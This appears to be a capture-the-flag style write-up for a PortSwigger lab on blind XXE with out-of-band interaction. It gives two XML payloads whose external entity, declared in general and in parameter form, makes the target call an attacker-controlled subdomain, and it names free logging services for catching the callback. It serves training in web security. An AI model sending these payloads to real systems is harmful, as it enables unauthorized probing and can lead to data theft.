# Lab 03 — Blind XXE with out-of-band interaction

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/blind-xxe-with-out-of-band-interaction)

**Entry point:** `POST /product/stock` — parsed but never echoed; no error

> **Burp Community alternative (free):** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
output. **Tool:** Burp Collaborator.

## Solution

1. Inject a DOCTYPE whose external entity resolves your Collaborator domain
   (the entity is never used, only *declared and resolved*):

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://YOUR-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Hmm — with no echo, reference via the parameter-entity form that works
even when general entities are blocked:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

2. **Poll now** in Collaborator — an HTTP/DNS interaction from the target
   appears — blind XXE confirmed — lab solved.

## Notes

Parameter entities (`%xxe;`) are the reliable OOB channel: they are resolved
inside the DTD itself, before/independently of element parsing.
